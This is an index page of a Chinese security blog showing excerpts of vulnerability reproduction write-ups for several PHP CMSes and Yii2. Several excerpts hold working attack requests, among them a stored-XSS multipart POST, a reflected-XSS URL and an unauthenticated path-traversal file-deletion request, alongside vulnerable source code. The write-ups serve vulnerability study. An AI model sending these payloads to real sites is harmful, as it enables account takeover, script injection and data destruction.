<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/page/18/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-Yunyecms/Yunyecms V2.0.2 前台注入漏洞（一）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Yunyecms/Yunyecms%20V2.0.2%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
  <time datetime="2022-07-08T06:26:08.517Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Yunyecms-V2-0-2-前台注入漏洞（一）"><a href="#Yunyecms-V2-0-2-前台注入漏洞（一）" class="headerlink" title="Yunyecms V2.0.2 前台注入漏洞（一）"></a>Yunyecms V2.0.2 前台注入漏洞（一）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>云业CMS内容管理系统是由云业信息科技开发的一款专门用于中小企业网站建设的PHP开源CMS，可用来快速建设一个品牌官网(PC，手机，微信都能访问)，后台功能强大，安全稳定，操作简单。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>yunyecms 2.0.2</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>下载源码，搭建起来，打开登录页面。</p>
<pre><code>http://127.0.0.1/yunyecms_2.0.2/admin.php?c=login&amp;=
1
</code></pre>
<p>打开Seay源代码审计工具，分析代码。经过一番寻找与”提示”，发现getip()方法获取ip没有进行过滤，可能有戏。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Yunyecms/Yunyecms%20V2.0.2%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Yunyecms/Yunyecms%20V2.0.2%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="cl5c2qz5o00ngy8v1exoxcds3" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Yunucms/Yunucms v2.0.7 数据库泄露" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Yunucms/Yunucms%20v2.0.7%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%84%E9%9C%B2/" class="article-date">
  <time datetime="2022-07-08T06:26:08.460Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Yunucms-v2-0-7-数据库泄露"><a href="#Yunucms-v2-0-7-数据库泄露" class="headerlink" title="Yunucms v2.0.7 数据库泄露"></a>Yunucms v2.0.7 数据库泄露</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>云优CMS是一款基于TP5.0框架为核心开发的一套免费+开源的城市分站内容管理系统。云优CMS前身为远航CMS。云优CMS于2017年9月上线全新版本，二级域名分站，内容分站独立，七牛云存储，自定义字段，自定义表单，自定义栏目权限，自定义管理权限等众多功能深受用户青睐。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Yunucms v2.0.7</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><pre><code>POST /index.php?s=/admin/data/export HTTP/1.1

public function export($ids = null, $id = null, $start = null) &#123;
        $Request = Request::instance();
        if ($Request-&gt;isPost() &amp;&amp; !empty($ids) &amp;&amp; is_array($ids)) &#123; //初始化
            $path = config(&#39;data_backup_path&#39;);
            is_dir($path) || mkdir($path, 755, true);
            //读取备份配置
            $config = [
                &#39;path&#39; =&gt; realpath($path) . DIRECTORY_SEPARATOR,
                &#39;part&#39; =&gt; config(&#39;data_backup_part_size&#39;),
                &#39;compress&#39; =&gt; config(&#39;data_backup_compress&#39;),
                &#39;level&#39; =&gt; config(&#39;data_backup_compress_level&#39;),
            ];

            //检查是否有正在执行的任务
            $lock = &quot;&#123;$config[&#39;path&#39;]&#125;backup.lock&quot;;
            if (is_file($lock)) &#123;
                return $this-&gt;error(&#39;检测到有一个备份任务正在执行，请稍后再试，或手动删除&quot;&#39;.$lock.&#39;&quot;后重试！&#39;);
            &#125;
            file_put_contents($lock, $Request-&gt;time()); //创建锁文件
            //检查备份目录是否可写
            is_writeable($config[&#39;path&#39;]) || $this-&gt;error(&#39;备份目录不存在或不可写，请检查后重试！&#39;);
            session(&#39;backup_config&#39;, $config);

            //生成备份文件信息
            $file = [
                &#39;name&#39; =&gt; date(&#39;Ymd-His&#39;, $Request-&gt;time()),
                &#39;part&#39; =&gt; 1,
            ];
            session(&#39;backup_file&#39;, $file);
            //缓存要备份的表
            session(&#39;backup_tables&#39;, $ids);

            //创建备份文件
            $Database = new \com\Database($file, $config);
            if (false !== $Database-&gt;create()) &#123;
                $tab = [&#39;id&#39; =&gt; 0, &#39;start&#39; =&gt; 0];
                return $this-&gt;success(&#39;初始化成功！&#39;, &#39;&#39;, [&#39;tables&#39; =&gt; $ids, &#39;tab&#39; =&gt; $tab]);
            &#125; else &#123;
                return $this-&gt;error(&#39;初始化失败，备份文件创建失败！&#39;);
            &#125;
        &#125;
......
</code></pre>
<p>可以看到，备份文件的命名用的time方法，跟进</p>
<pre><code>public function time($float = false)
    &#123;
        return $float ? $_SERVER[&#39;REQUEST_TIME_FLOAT&#39;] : $_SERVER[&#39;REQUEST_TIME&#39;];
    &#125;
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Yunucms/Yunucms%20v2.0.7%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%84%E9%9C%B2/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Yunucms/Yunucms%20v2.0.7%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%84%E9%9C%B2/" data-id="cl5c2qz0m00nfy8v1cjrjdc4i" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Yunucms/Yunucms v2.0.7 后台xss" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Yunucms/Yunucms%20v2.0.7%20%E5%90%8E%E5%8F%B0xss/" class="article-date">
  <time datetime="2022-07-08T06:26:08.457Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Yunucms-v2-0-7-后台xss"><a href="#Yunucms-v2-0-7-后台xss" class="headerlink" title="Yunucms v2.0.7 后台xss"></a>Yunucms v2.0.7 后台xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>云优CMS是一款基于TP5.0框架为核心开发的一套免费+开源的城市分站内容管理系统。云优CMS前身为远航CMS。云优CMS于2017年9月上线全新版本，二级域名分站，内容分站独立，七牛云存储，自定义字段，自定义表单，自定义栏目权限，自定义管理权限等众多功能深受用户青睐。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Yunucms v2.0.7</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>从<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/www.yunucms.com/Buy/program.html">官网</a>下载源码并进行过安装</p>
<p>需要注意的是需要填云账号，我去官网注册了一个随便填上了，账号testqwe，密码123456，手机号利用的在线短信注册的</p>
<p><img src="/resource/Yunucmsv2.0.7%E5%90%8E%E5%8F%B0xss/media/rId26.png"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Yunucms/Yunucms%20v2.0.7%20%E5%90%8E%E5%8F%B0xss/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Yunucms/Yunucms%20v2.0.7%20%E5%90%8E%E5%8F%B0xss/" data-id="cl5c2qz0m00ney8v1dkykh32z" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-YouDianCMS/YouDianCMS 8.0 Storeage XSS" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/YouDianCMS/YouDianCMS%208.0%20Storeage%20XSS/" class="article-date">
  <time datetime="2022-07-08T06:26:08.453Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="YouDianCMS-8-0-Storeage-XSS"><a href="#YouDianCMS-8-0-Storeage-XSS" class="headerlink" title="YouDianCMS 8.0 Storeage XSS"></a>YouDianCMS 8.0 Storeage XSS</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YouDianCMS 8.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>POST /index.php/Admin/wx/saveSubscribeReply 
HTTP/1.1 Host: 127.0.0.1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 
Accept: application/json, text/javascript, /; q=0.01 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 
Referer: http://0-sec.org/index.php/Admin/Wx/subscribereply/l/en/random/1560696407129 
X-Requested-With: XMLHttpRequest 
Content-Type: multipart/form-data; 
boundary=---------------------------17443203555821 
Content-Length: 2207 
DNT: 1 
Connection: close 
Cookie: PHPSESSID=bkv171om25ji6a51t7dql010h2; youdianAdminLangSet=en; CKFinder_Path=Files%3A%2F%3A1; CKFinder_Settings=TNNDS; youdianMenuTopID=15

-----------------------------17443203555821 Content-Disposition: form-data; name=&quot;ReplyID&quot;

1 -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;TypeID&quot;

1 -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a1&quot;

&quot;&gt;&lt;scRIPT&gt;alert(1)&lt;/SCRIPT&gt; -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a2&quot;

2 -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a3&quot;

1 -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a4&quot;

&quot;&gt;&lt;scRIPT&gt;alert(1)&lt;/SCRIPT&gt; -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a5&quot;

1 -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a6&quot;

-----------------------------17443203555821 Content-Disposition: form-data; name=&quot;musicfile&quot;

-----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a11&quot;

-----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a12&quot;

1 -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a13&quot;

-----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a14&quot;

-----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a15&quot;

&quot;&gt;&lt;scRIPT&gt;alert(1)&lt;/SCRIPT&gt; -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a16&quot;

1 -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a7&quot;

2 -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a8&quot;

2,大转盘 -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a10&quot;

-----------------------------17443203555821 Content-Disposition: form-data; name=&quot;a9&quot;

&quot;&gt;&lt;scRIPT&gt;alert(1)&lt;/SCRIPT&gt; -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;IsEnable&quot;

1 -----------------------------17443203555821 Content-Disposition: form-data; name=&quot;hash&quot;

19b37a0a1054dfd209b9a17c704027f3_db90bddc24f4e98592b355e2cbbca612 -----------------------------17443203555821--
</code></pre>
<p>该漏洞触发的位置在”微信平台”-“自动回复”-“跟踪自动回复”的”微信短信”中，最后点击保存触发。</p>
<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/ReboOt68/youdiancms8.0-StoreageXSS-POC/issues/2">https://github.com/ReboOt68/youdiancms8.0-StoreageXSS-POC/issues/2</a></p>
</blockquote>

        
          <p class="article-more-link">
            <a href="/2022/07/07/YouDianCMS/YouDianCMS%208.0%20Storeage%20XSS/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/YouDianCMS/YouDianCMS%208.0%20Storeage%20XSS/" data-id="cl5c2qyu000mvy8v1fxra2ut1" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-YouDianCMS/YouDianCMS 8.0 sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/YouDianCMS/YouDianCMS%208.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:08.450Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="YouDianCMS-8-0-sql注入漏洞"><a href="#YouDianCMS-8-0-sql注入漏洞" class="headerlink" title="YouDianCMS 8.0 sql注入漏洞"></a>YouDianCMS 8.0 sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YouDianCMS 8.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>需要先登录此漏洞。页面可以注册。</p>
<p><a target="_blank" rel="noopener" href="http://localhost/youdiancms/index.php/public/reg/l/cn">http://localhost/youdiancms/index.php/public/reg/l/cn</a></p>
<p>在这里登录</p>
<p>漏洞位置位于index.php/member/customer/index搜索栏</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/YouDianCMS/YouDianCMS%208.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/YouDianCMS/YouDianCMS%208.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qyu100mwy8v1bchi3omm" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Yii2/（CVE-2020-15148）Yii2框架反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Yii2/%EF%BC%88CVE-2020-15148%EF%BC%89Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:08.412Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-15148）Yii2框架反序列化漏洞"><a href="#（CVE-2020-15148）Yii2框架反序列化漏洞" class="headerlink" title="（CVE-2020-15148）Yii2框架反序列化漏洞"></a>（CVE-2020-15148）Yii2框架反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>如果在使用yii框架，并且在用户可以控制的输入处调用了unserialize()并允许特殊字符的情况下，会受到反序列化远程命令命令执行漏洞攻击。</p>
<p>该漏洞只是php<br>反序列化的执行链，必须要配合<code>unserialize</code>函数才可以达到任意代码执行的危害。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Yii2 &lt;2.0.38</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>由于我本地的composer不知道为啥特别慢（换源也不管用），所以这里直接去<code>Yii2</code>的官方仓库里面拉。</p>
<p><img src="/resource/(CVE-2020-15148)Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.jpg" alt="1.jpg"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Yii2/%EF%BC%88CVE-2020-15148%EF%BC%89Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Yii2/%EF%BC%88CVE-2020-15148%EF%BC%89Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qyz200ndy8v1fld76lrm" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-YCCMS/YCCMS 3.4 未授权更改管理员账号密码" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/YCCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/" class="article-date">
  <time datetime="2022-07-08T06:26:08.358Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="YCCMS-3-4-未授权更改管理员账号密码"><a href="#YCCMS-3-4-未授权更改管理员账号密码" class="headerlink" title="YCCMS 3.4 未授权更改管理员账号密码"></a>YCCMS 3.4 未授权更改管理员账号密码</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YCCMS 3.4</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先来看一下漏洞利用过程，在未登录的情况下构造url,只需要更改username<br>password notpassword的值即可更改数据库中admin账号的相关信息<img src="/resource/YCCMS3.4%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/media/rId24.png" alt="1.png">去数据库中查看发现已经更改了账号密码<img src="/resource/YCCMS3.4%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/media/rId25.png" alt="2.png">根据url来定位一下漏洞函数，函数位于controller\AdminAction.class.php中的update函数</p>
<pre><code>public function update()&#123;
        if(isset($_POST[&#39;send&#39;]))&#123;
            if(validate::isNullString($_POST[&#39;username&#39;])) Tool::t_back(&#39;用户名不能为空&#39;,&#39;?a=admin&amp;m=update&#39;);
            if(validate::isNullString($_POST[&#39;password&#39;])) Tool::t_back(&#39;密码不能为空!&#39;,&#39;?a=admin&amp;m=update&#39;);
            if(!(validate::checkStrEquals($_POST[&#39;password&#39;], $_POST[&#39;notpassword&#39;]))) Tool::t_back(&#39;两次密码不一致!&#39;,&#39;?a=admin&amp;m=update&#39;);
            $this-&gt;_model-&gt;username=$_POST[&#39;username&#39;];
            $this-&gt;_model-&gt;password=sha1($_POST[&#39;password&#39;]);
            $_edit=$this-&gt;_model-&gt;editAdmin();
            if($_edit)&#123;
                tool::layer_alert(&#39;密码修改成功!&#39;,&#39;?a=admin&amp;m=update&#39;,6);
                &#125;else&#123;
                tool::layer_alert(&#39;密码未修改!&#39;,&#39;?a=admin&amp;m=update&#39;,6);
            &#125;
        &#125;

            $this-&gt;_tpl-&gt;assign(&#39;admin&#39;, $_SESSION[&#39;admin&#39;]);
            $this-&gt;_tpl-&gt;display(&#39;admin/public/update.tpl&#39;);
    &#125;
</code></pre>
<p>可以看到前面都是一些判断，重点关注下editAdmin()函数，该函数位于model\AdminModel.class.php</p>
<pre><code>public function editAdmin()&#123;
        $_sql=&quot;UPDATE
                    my_admin
                SET
                    username=&#39;$this-&gt;username&#39;,
                    password=&#39;$this-&gt;password&#39;
                WHERE
                    id=1
                LIMIT 1&quot;;
        return parent::update($_sql);
    &#125;
</code></pre>
<p>该函数的父类为Model, 位于model\Model.class.php，看一下update函数</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/YCCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/YCCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/" data-id="cl5c2qywo00ncy8v18hc7ese3" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-YCCMS/YCCMS 3.4 反射型xss" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/YCCMS/YCCMS%203.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="article-date">
  <time datetime="2022-07-08T06:26:08.355Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="YCCMS-3-4-反射型xss"><a href="#YCCMS-3-4-反射型xss" class="headerlink" title="YCCMS 3.4 反射型xss"></a>YCCMS 3.4 反射型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YCCMS 3.4</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>https://www.0-sec.org/admin/?a=html&amp;art=&lt;sCrIpT&gt;alert(ian)&lt;%2FsCrIpT&gt;&amp;m=arts
</code></pre>

        
          <p class="article-more-link">
            <a href="/2022/07/07/YCCMS/YCCMS%203.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/YCCMS/YCCMS%203.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" data-id="cl5c2qywn00n9y8v19vy88lh0" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-YCCMS/YCCMS 3.4 任意文件删除" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/YCCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" class="article-date">
  <time datetime="2022-07-08T06:26:08.353Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="YCCMS-3-4-任意文件删除"><a href="#YCCMS-3-4-任意文件删除" class="headerlink" title="YCCMS 3.4 任意文件删除"></a>YCCMS 3.4 任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="YCCMS-3-4"><a href="#YCCMS-3-4" class="headerlink" title="YCCMS 3.4"></a>YCCMS 3.4</h2><p>三、复现过程</p>
<pre><code>POST /admin/?a=pic&amp;m=delall HTTP/1.1
Host: www.0-sec.org:8082
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Origin: http://127.0.0.1:8082
Connection: close
Referer: http://127.0.0.1:8082/admin/?a=pic
Upgrade-Insecure-Requests: 1

pid%5B0%5D=../1.txt&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87t
</code></pre>
<p>只需要更改pid[0]即可在无登录条件下任意删除文件，删除根目录下的1.txt<img src="/resource/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/media/rId24.png" alt="3.png">已经删除成功了<img src="/resource/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/media/rId25.png" alt="4.png">其实这还是犯了一个最容易犯的错误，没有对传进来的路径进行过滤就拼接了目录，导致了任意文件删除漏洞的产生根据url定位到相关函数位置,位于/controller/PicAction.class.php</p>
<pre><code>public function delall()&#123;
        if(isset($_POST[&#39;send&#39;]))&#123;
